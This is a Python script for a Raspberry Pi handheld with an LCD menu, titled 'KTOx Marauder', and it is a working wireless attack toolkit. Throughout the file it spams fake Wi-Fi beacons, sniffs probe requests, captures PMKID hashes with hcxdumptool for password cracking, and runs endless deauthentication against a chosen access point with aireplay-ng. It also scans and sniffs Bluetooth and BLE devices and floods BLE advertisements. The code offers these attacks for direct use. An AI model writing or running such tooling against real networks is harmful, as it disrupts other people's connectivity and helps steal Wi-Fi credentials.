#!/usr/bin/env python3
import os
import sys
import time
import signal
import subprocess
import re
import threading
import random
from PIL import Image, ImageDraw, ImageFont
import RPi.GPIO as GPIO
import LCD_1in44
from scapy.all import *
import bluetooth

# ========================
# GLOBAL CONFIG & STATE
# ========================
RUNNING = True
active_process = None
ATTACK_IFACE = None
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "PRESS": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}

# LCD Setup
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
font = ImageFont.load_default()

# ========================
# UI ENGINE
# ========================

def display(lines):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    draw = ImageDraw.Draw(img)
    for i, line in enumerate(lines[:8]):
        draw.text((5, 5 + (i * 15)), line, fill="white", font=font)
    LCD.LCD_ShowImage(img, 0, 0)

def menu(title, options):
    idx = 0
    while True:
        display([f"[{title}]"] + [("> " if i == idx else "  ") + opt for i, opt in enumerate(options)])
        time.sleep(0.1)
        if GPIO.input(PINS["UP"]) == 0: idx = (idx - 1) % len(options)
        if GPIO.input(PINS["DOWN"]) == 0: idx = (idx + 1) % len(options)
        if GPIO.input(PINS["PRESS"]) == 0: return options[idx]
        if GPIO.input(PINS["KEY3"]) == 0: return "BACK"

# ========================
# UTILITIES
# ========================

def kill_process():
    global active_process
    if active_process:
        try:
            os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
        except: pass
        active_process = None

def setup_monitor():
    display(["Starting Monitor", "Mode..."])
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    subprocess.run(["airmon-ng", "start", "wlan0"], capture_output=True)
    res = subprocess.check_output(["iwconfig"]).decode()
    match = re.search(r"wlan\d+mon", res)
    return match.group(0) if match else "wlan0mon"

# ========================
# WIFI MODULES
# ========================

def beacon_spam(mode="RICKROLL"):
    ssids = ["Never Gonna", "Give You Up", "Never Gonna", "Let You Down"] if mode == "RICKROLL" else [f"M_Net_{random.randint(10,99)}" for _ in range(15)]
    display(["Beacon Spamming", "KEY3 to Stop"])
    frames = []
    for s in ssids:
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
        beacon = Dot11Beacon(cap="ESS+privacy")
        essid = Dot11Elt(ID="SSID", info=s, len=len(s))
        frames.append(RadioTap()/dot11/beacon/essid)
    while GPIO.input(PINS["KEY3"]) != 0:
        for f in frames: sendp(f, iface=ATTACK_IFACE, verbose=False, count=1)
        time.sleep(0.05)

def probe_sniffer():
    found = set()
    display(["Sniffing Probes", "KEY3 to Stop"])
    def cb(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            s = pkt.info.decode(errors='ignore')
            if s and s not in found:
                found.add(s)
                display(["Probe Found:", s[:10], f"Total: {len(found)}", "KEY3 to Stop"])
    sniff(iface=ATTACK_IFACE, prn=cb, stop_filter=lambda x: GPIO.input(PINS["KEY3"]) == 0)

def pmkid_capture():
    display(["Capturing PMKID", "Using hcxtools", "KEY3 to Stop"])
    pcap = f"/home/pi/cap_{int(time.time())}.pcapng"
    global active_process
    active_process = subprocess.Popen(["hcxdumptool", "-i", ATTACK_IFACE, "-o", pcap], preexec_fn=os.setsid)
    while GPIO.input(PINS["KEY3"]) != 0: time.sleep(0.2)
    kill_process()

def scan_and_deauth():
    display(["Scanning...", "Please wait 10s"])
    if os.path.exists("/tmp/s-01.csv"): os.remove("/tmp/s-01.csv")
    p = subprocess.Popen(["airodump-ng", "-w", "/tmp/s", "--output-format", "csv", ATTACK_IFACE], preexec_fn=os.setsid)
    time.sleep(10)
    os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    aps = []
    try:
        with open("/tmp/s-01.csv", "r") as f:
            for line in f:
                parts = line.split(",")
                if len(parts) > 13 and ":" in parts[0] and "BSSID" not in parts[0]:
                    aps.append({"b": parts[0].strip(), "e": parts[13].strip()})
    except: pass
    if not aps: return
    target = menu("Target", [a["e"][:12] for a in aps])
    if target == "BACK": return
    t_mac = next(a["b"] for a in aps if a["e"][:12] == target)
    display(["Deauthing...", target, "KEY3 to Stop"])
    global active_process
    active_process = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", t_mac, ATTACK_IFACE], preexec_fn=os.setsid)
    while GPIO.input(PINS["KEY3"]) != 0: time.sleep(0.1)
    kill_process()

# ========================
# BLUETOOTH MODULES
# ========================

def bt_scan():
    display(["BT Scan (8s)..."])
    try:
        devs = bluetooth.discover_devices(duration=8, lookup_names=True)
        menu("BT Found", [f"{n[:10]}" for a, n in devs] if devs else ["No Devices"])
    except: display(["BT Error"])

def ble_sniff():
    display(["BLE Sniffing", "KEY3 to Stop"])
    p = subprocess.Popen(["sudo", "hcitool", "lescan", "--duplicates"], stdout=subprocess.PIPE, preexec_fn=os.setsid)
    try:
        while GPIO.input(PINS["KEY3"]) != 0:
            line = p.stdout.readline().decode().strip()
            if line: display(["BLE:", line.split(" ")[0], "KEY3 to Stop"])
    finally: os.killpg(os.getpgid(p.pid), signal.SIGTERM)

def ble_spam():
    display(["BLE Spamming", "KEY3 to Stop"])
    os.system("sudo hciconfig hci0 up && sudo hciconfig hci0 leadv 3")
    while GPIO.input(PINS["KEY3"]) != 0:
        r = ''.join(random.choices('0123456789ABCDEF', k=6))
        os.system(f"sudo hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 1A 1A FF 4C 00 02 15 {r} 00")
        time.sleep(0.3)
    os.system("sudo hciconfig hci0 noleadv")

# ========================
# MAIN LOOP
# ========================

def main():
    global ATTACK_IFACE, RUNNING
    GPIO.setmode(GPIO.BCM)
    for p in PINS.values(): GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    
    ATTACK_IFACE = setup_monitor()

    while RUNNING:
        top = menu("KTOx Marauder", ["WiFi Attacks", "Bluetooth", "Sniffing", "Exit"])
        if top == "WiFi Attacks":
            sub = menu("WiFi", ["Beacon Rickroll", "Beacon Random", "Deauth Target", "BACK"])
            if "Rickroll" in sub: beacon_spam("RICKROLL")
            elif "Random" in sub: beacon_spam("RANDOM")
            elif "Deauth" in sub: scan_and_deauth()
        elif top == "Bluetooth":
            sub = menu("BT", ["Classic Scan", "BLE Sniff", "BLE Spam", "BACK"])
            if "Classic" in sub: bt_scan()
            elif "BLE Sniff" in sub: ble_sniff()
            elif "BLE Spam" in sub: ble_spam()
        elif top == "Sniffing":
            sub = menu("Sniff", ["Probe Sniff", "PMKID Capture", "BACK"])
            if "Probe" in sub: probe_sniffer()
            elif "PMKID" in sub: pmkid_capture()
        elif top == "Exit": break

    subprocess.run(["airmon-ng", "stop", ATTACK_IFACE])
    GPIO.cleanup()

if __name__ == "__main__":
    main()
